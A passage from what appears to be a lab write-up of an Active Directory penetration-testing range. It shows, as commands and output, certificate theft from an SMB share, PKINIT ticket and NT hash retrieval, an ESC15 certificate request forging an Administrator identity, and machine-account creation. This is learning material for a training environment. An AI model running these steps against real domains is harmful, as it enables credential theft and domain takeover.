    Minimum = 0ms, Maximum = 1ms, Average = 0ms
```

So we will need to put another agent on DC01.zenith.rv that will call back to DC02.dev.zenith.rv, and from there it gets redirected to our localhost - a three-hop chain through every host we have taken so far:

{% image98 %}

And then add the route:

{% image99 %}

If we try to scan the domain we can see that it's a normal domain controller:

```bash
Open 10.5.30.8:80
Open 10.5.30.8:22
Open 10.5.30.8:53
Open 10.5.30.8:88
Open 10.5.30.8:135
Open 10.5.30.8:139
Open 10.5.30.8:389
Open 10.5.30.8:445
Open 10.5.30.8:464
Open 10.5.30.8:593
Open 10.5.30.8:636
Open 10.5.30.8:3268
Open 10.5.30.8:3269
Open 10.5.30.8:3389
Open 10.5.30.8:5986
Open 10.5.30.8:5985
Open 10.5.30.8:9389
```

Port 80 on a DC is worth noting - that is often the ADCS web enrollment endpoint.

→ ldap users:

```bash
➜  domain_compromise netexec ldap mgmt-zenith.rv -u '0xd1s' -p 'Password123!' -d 'zenith.rv' --users
LDAP        10.5.30.8       389    DC03             [*] Windows Server 2022 Build 20348 (name:DC03) (domain:mgmt-zenith.rv)
LDAP        10.5.30.8       389    DC03             [+] zenith.rv\0xd1s:Password123!
LDAP        10.5.30.8       389    DC03             [*] Enumerated 9 domain users: zenith.rv
LDAP        10.5.30.8       389    DC03             -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.5.30.8       389    DC03             Administrator                 2026-03-18 07:58:27 3        Built-in account for administering the computer/domain
LDAP        10.5.30.8       389    DC03             Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        10.5.30.8       389    DC03             krbtgt                        2026-03-15 08:47:15 0        Key Distribution Center Service Account
LDAP        10.5.30.8       389    DC03             async_adm                     2026-03-18 07:58:32 1
LDAP        10.5.30.8       389    DC03             s.cb                          2026-03-18 07:55:12 0
LDAP        10.5.30.8       389    DC03             alex.johnson                  2026-03-18 07:56:59 0
LDAP        10.5.30.8       389    DC03             emily.davis                   2026-03-18 07:56:59 0
LDAP        10.5.30.8       389    DC03             michael.brown                 2026-03-18 07:56:59 0
LDAP        10.5.30.8       389    DC03             localuser                     2026-03-18 07:58:29 0
```

The forest trust means our backdoor account in `zenith.rv` can already query the third domain over LDAP.

→ bloodhound enumeration:

```bash
➜  domain_compromise bloodhound-ce-python --domain mgmt-zenith.rv --username '0xd1s@zenith.rv' --password 'Password123!' --nameserver 10.5.30.8 --domain-controller DC03.mgmt-zenith.rv --global-catalog DC03.mgmt-zenith.rv --collectionmethod all --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: mgmt-zenith.rv
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC03.mgmt-zenith.rv
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: DC03.mgmt-zenith.rv
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: srv01.mgmt-zenith.rv
INFO: Querying computer: dc03.mgmt-zenith.rv
INFO: Done in 00M 39S
INFO: Compressing output into 20260329173834_bloodhound.zip
```

→ ping sweep:

```bash
➜  domain_compromise for i in {1..254}; do (ping -c 1 10.5.30.$i | grep "bytes from" &) ;done
64 bytes from 10.5.30.8: icmp_seq=1 ttl=64 time=363 ms
64 bytes from 10.5.30.9: icmp_seq=1 ttl=64 time=362 ms
64 bytes from 10.5.30.254: icmp_seq=1 ttl=64 time=451 ms
64 bytes from 10.5.30.52: icmp_seq=1 ttl=64 time=3367 ms
```

→ SYSVOL DC03 Enumeration:

```bash
➜  domain_compromise impacket-smbclient zenith.rv/'0xd1s':'Password123!'@DC03.mgmt-zenith.rv
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use SYSVOL
# ls
drw-rw-rw-          0  Sun Mar 15 08:46:34 2026 .
drw-rw-rw-          0  Sun Mar 15 08:46:34 2026 ..
drw-rw-rw-          0  Sun Mar 15 08:46:34 2026 mgmt-zenith.rv
# cd mgmt-zenith.rv
# ls
drw-rw-rw-          0  Sun Mar 15 08:47:56 2026 .
drw-rw-rw-          0  Sun Mar 15 08:46:34 2026 ..
drw-rw-rw-          0  Wed Mar 18 07:41:34 2026 DfsrPrivate
drw-rw-rw-          0  Sun Mar 15 08:46:34 2026 Policies
drw-rw-rw-          0  Sun Mar 15 08:46:34 2026 scripts
# cd scripts
ls
# ls
drw-rw-rw-          0  Sun Mar 15 08:46:34 2026 .
drw-rw-rw-          0  Sun Mar 15 08:47:56 2026 ..
```

No logon scripts and no GPP passwords - nothing to harvest from SYSVOL this time.

### DC03 - NMAP Scanning

```bash
Open 10.5.30.8:80
Open 10.5.30.8:22
Open 10.5.30.8:53
Open 10.5.30.8:88
Open 10.5.30.8:135
Open 10.5.30.8:139
Open 10.5.30.8:389
Open 10.5.30.8:445
Open 10.5.30.8:464
Open 10.5.30.8:593
Open 10.5.30.8:636
Open 10.5.30.8:3268
Open 10.5.30.8:3269
Open 10.5.30.8:3389
Open 10.5.30.8:5986
Open 10.5.30.8:5985
Open 10.5.30.8:9389
```

### SRV01 - NMAP Scanning

```bash
Open 10.5.30.9:22
Open 10.5.30.9:135
Open 10.5.30.9:139
Open 10.5.30.9:445
Open 10.5.30.9:3389
Open 10.5.30.9:5986
Open 10.5.30.9:5985
```

This second host is SRV01, the only other machine in the domain.

### SRV01 - Certificate Theft and PKINIT as s.cb

Inside of the SRV01 machine in the Public share we can see the following:

```bash
➜  domain_compromise impacket-smbclient zenith.rv/'0xd1s':'Password123!'@SRV01.mgmt-zenith.rv
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use Public
# ls
drw-rw-rw-          0  Sun Mar 29 17:45:38 2026 .
drw-rw-rw-          0  Wed Mar 18 07:55:14 2026 ..
-rw-rw-rw-       2184  Wed Mar 18 07:55:51 2026 cert.pem
-rw-rw-rw-       1680  Wed Mar 18 07:55:51 2026 key.pem
```

This share is described as `Share used for general file sharing` - and someone has left a certificate together with its private key in it, which is exactly the kind of oversight that turns into domain authentication.

→ Inspecting the cert.pem file: `openssl x509 -in cert.pem -text -noout`

{% image100 %}

→ Inspecting the private key: `openssl rsa -in key.pem -check`

→ Verifying that the key matches the cert:

```bash
➜  domain_compromise openssl x509 -noout -modulus -in cert.pem | openssl md5
openssl rsa  -noout -modulus -in key.pem  | openssl md5
MD5(stdin)= 5e917399f87cf0fe174b33c4a5c602c4
MD5(stdin)= 5e917399f87cf0fe174b33c4a5c602c4
```

Matching moduli confirm the key belongs to the certificate.

→ Converting to a PFX file:

```bash
➜  domain_compromise openssl pkcs12 -export -out cert.pfx -inkey key.pem -in cert.pem
Enter Export Password:
Verifying - Enter Export Password:
➜  domain_compromise ls -l cert.pfx
-rw------- 1 kali kali 3331 Mar 29 18:07 cert.pfx
```

→ Getting the TGT:

```bash
➜  domain_compromise python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass 'Password123!' mgmt-zenith.rv/s.cb -dc-ip 10.5.30.8 s.cb.ccache
2026-03-29 18:10:25,445 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2026-03-29 18:10:25,462 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2026-03-29 18:10:25,870 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2026-03-29 18:10:25,870 minikerberos INFO     5fd70fa083ea58b417808ab17a5f18acc301480df0010506901d8497c5a9c70c
INFO:minikerberos:5fd70fa083ea58b417808ab17a5f18acc301480df0010506901d8497c5a9c70c
2026-03-29 18:10:25,875 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

The certificate is a client authentication certificate for `s.cb`, so PKINIT hands us a TGT with no password at all. Or we could use `certipy` to do this process faster, which also recovers the account's NT hash from the PKINIT exchange:

```bash
➜  domain_compromise certipy-ad auth -pfx cert.pfx -username s.cb -domain mgmt-zenith.rv -password 'Password123!' -dns-tcp -dc-ip 10.5.30.8
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 's.cb@mgmt-zenith.rv'
[*]     Security Extension SID: 'S-1-5-21-2244198459-2043822163-2948862655-1602'
[*] Using principal: 's.cb@mgmt-zenith.rv'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 's.cb.ccache'
File 's.cb.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 's.cb.ccache'
[*] Trying to retrieve NT hash for 's.cb'
[*] Got hash for 's.cb@mgmt-zenith.rv': aad3b435b51404eeaad3b435b51404ee:e5e88d84c3b66e26a3a2070b612b85cf
```

But if we try to use the NT hash we will get the following:

{% image101 %}

This is because this user is a member of the `PROTECTED USERS` group, which blocks NTLM authentication and RC4 Kerberos outright:

{% image102 %}

The certificate still works, though - Protected Users restricts what we can do with the hash, not with PKINIT.

### ADCS - ESC15 Template Abuse

→ Active Directory Certificate Services presence:

```bash
➜  domain_compromise netexec ldap 10.5.30.8 -u '0xd1s' -p 'Password123!' -d 'zenith.rv' -M adcs
LDAP        10.5.30.8       389    DC03             [*] Windows Server 2022 Build 20348 (name:DC03) (domain:mgmt-zenith.rv)
LDAP        10.5.30.8       389    DC03             [+] zenith.rv\0xd1s:Password123!
ADCS        10.5.30.8       389    DC03             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.5.30.8       389    DC03             Found PKI Enrollment Server: dc03.mgmt-zenith.rv
ADCS        10.5.30.8       389    DC03             Found CN: zenith-rv-CA
```

→ certipy enumeration ( trimmed to the CA summary and the one vulnerable template; the full run enumerates all 34 templates and their permissions ):

```bash
➜  domain_compromise certipy-ad find -u 0xd1s@zenith.rv -p 'Password123!' -dc-ip 10.5.30.8 -vulnerable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[-] Could not find user '0XD1S'
[!] User SID can't be retrieved. For more accurate results, add it manually with -sid
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Retrieving CA configuration for 'zenith-rv-CA' via RRP
[*] Successfully retrieved CA configuration for 'zenith-rv-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : zenith-rv-CA
    DNS Name                            : dc03.mgmt-zenith.rv
    Certificate Subject                 : CN=zenith-rv-CA, DC=mgmt-zenith, DC=rv
    Certificate Validity End            : 2031-03-18 05:55:06+00:00
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Permissions
      Access Rights
        ManageCa                        : MGMT-ZENITH.RV\Administrators
                                          MGMT-ZENITH.RV\Domain Admins
                                          MGMT-ZENITH.RV\Enterprise Admins
        Enroll                          : MGMT-ZENITH.RV\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : zenith-rv-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Permissions
      Enrollment Permissions
        Enrollment Rights               : MGMT-ZENITH.RV\Domain Users
                                          MGMT-ZENITH.RV\Domain Admins
                                          MGMT-ZENITH.RV\Enterprise Admins
    [+] User Enrollable Principals      : MGMT-ZENITH.RV\Domain Users
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

ESC15 (CVE-2024-49019) is the interesting one. The `WebServer` template is schema version 1, lets the enrollee supply the subject, and is enrollable by all Domain Users. On an unpatched CA, a version 1 template ignores the application policies embedded in the request, which means we can ask for a "server authentication" certificate while smuggling in a client authentication policy and a UPN of our choosing - including Administrator.

→ Command:

```bash
certipy-ad req -u 0xd1s@zenith.rv -p 'Password123!' -dc-ip 10.5.30.8 -target DC03.mgmt-zenith.rv -ca 'zenith-rv-CA' -template 'WebServer' -upn 'administrator@mgmt-zenith.rv' -sid 'S-1-5-21-2244198459-2043822163-2948862655-500' -application-policies 'Client Authentication'
```

But if we launch this command we will get an error:

```bash
➜  domain_compromise netexec smb DC03.mgmt-zenith.rv -u 's.cb' -H 'e5e88d84c3b66e26a3a2070b612b85cf' -d mgmt-zenith.rv -k
SMB         DC03.mgmt-zenith.rv 445    DC03             [*] Windows Server 2022 Build 20348 x64 (name:DC03) (domain:mgmt-zenith.rv) (signing:True) (SMBv1:False)
SMB         DC03.mgmt-zenith.rv 445    DC03             [-] mgmt-zenith.rv\s.cb:e5e88d84c3b66e26a3a2070b612b85cf KDC_ERR_ETYPE_NOSUPP
```

`KDC_ERR_ETYPE_NOSUPP` is Protected Users again, refusing the RC4 etype that pass-the-hash needs. So in order to bypass this error we used the certificate directly to open an LDAP shell, sidestepping hashes entirely:

```bash
➜  domain_compromise certipy-ad auth -pfx cert.pfx -dc-ip 10.5.30.8 -domain mgmt-zenith.rv -username 's.cb' -ldap-shell -password 'Password123!'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 's.cb@mgmt-zenith.rv'
[*]     Security Extension SID: 'S-1-5-21-2244198459-2043822163-2948862655-1602'
[*] Connecting to 'ldaps://10.5.30.8:636'
[*] Authenticated to '10.5.30.8' as: 'u:mgmt-zenith\\s.cb'
Type help for list of commands

#
```

→ Creating a computer ( any domain user can add up to ten machines by default, via `ms-DS-MachineAccountQuota` ):

```bash
# add_computer 0xd1s Password123!
Attempting to add a new computer with the name: 0xd1s$
Inferred Domain DN: DC=mgmt-zenith,DC=rv
Inferred Domain Name: mgmt-zenith.rv
New Computer DN: CN=0xd1s,CN=Computers,DC=mgmt-zenith,DC=rv
Adding new computer with username: 0xd1s$ and password: Password123! result: OK
```

→ Validating the machine account - note the trailing `$`, which is easy to forget and looks identical to a wrong password:

```bash
➜  domain_compromise netexec smb DC03.mgmt-zenith.rv -u '0xd1s' -p 'Password123!' --shares
SMB         10.5.30.8       445    DC03             [*] Windows Server 2022 Build 20348 x64 (name:DC03) (domain:mgmt-zenith.rv) (signing:True) (SMBv1:False)
SMB         10.5.30.8       445    DC03             [-] mgmt-zenith.rv\0xd1s:Password123! STATUS_LOGON_FAILURE
➜  domain_compromise netexec smb DC03.mgmt-zenith.rv -u '0xd1s$' -p 'Password123!' --shares
SMB         10.5.30.8       445    DC03             [*] Windows Server 2022 Build 20348 x64 (name:DC03) (domain:mgmt-zenith.rv) (signing:True) (SMBv1:False)
SMB         10.5.30.8       445    DC03             [+] mgmt-zenith.rv\0xd1s$:Password123!
SMB         10.5.30.8       445    DC03             [*] Enumerated shares
SMB         10.5.30.8       445    DC03             Share           Permissions     Remark
SMB         10.5.30.8       445    DC03             -----           -----------     ------
SMB         10.5.30.8       445    DC03             ADMIN$                          Remote Admin
SMB         10.5.30.8       445    DC03             C$                              Default share
SMB         10.5.30.8       445    DC03             IPC$            READ            Remote IPC
SMB         10.5.30.8       445    DC03             NETLOGON        READ            Logon server share
SMB         10.5.30.8       445    DC03             SYSVOL          READ            Logon server share
```

→ Using bloodyad:

```bash
➜  domain_compromise bloodyad --host DC03.mgmt-zenith.rv -d mgmt-zenith.rv --username 's.cb' --certificate cert.pfx --password 'Password123!' --dc-ip 10.5.30.8 --secure get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=mgmt-zenith,DC=rv
permission: WRITE

distinguishedName: CN=Sim Cher Boon,CN=Users,DC=mgmt-zenith,DC=rv
permission: WRITE

distinguishedName: CN=Sim Cher Boon,CN=Users,DC=mgmt-zenith,DC=rv
permission: WRITE

distinguishedName: CN=0xd1s,CN=Computers,DC=mgmt-zenith,DC=rv
permission: WRITE
```

And this is where I stopped - I was able to grab 9 flags out of 12. The pieces for the last stretch are all on the table: an ESC15 primitive on an unpatched CA, a certificate-authenticated foothold as `s.cb`, and a machine account we fully control in the third domain. I simply ran out of time before turning that into a full compromise of `mgmt-zenith.rv`.

Looking back, what makes this range worth the time is how deliberately each step is chained. The sudo-able `redirect.sh` on the jump box seems like a throwaway finding until it becomes the missing network hop for an NTLM relay hours later. The application source code you read off an SMB share is the same code you later exploit through an attribute you can write because of an ACL you found in BloodHound. Nothing is decorative. The range was awesome and I liked it very much.

I strongly recommend supporting the team that created the range by purchasing the W200 course [https://shop.async.sg/collections/w200-introduction-to-active-directory-penetration-testing](https://shop.async.sg/collections/w200-introduction-to-active-directory-penetration-testing) - I have it, I finished the course, I took the exam, I conquered it, and what I can say is that it's insanely good!
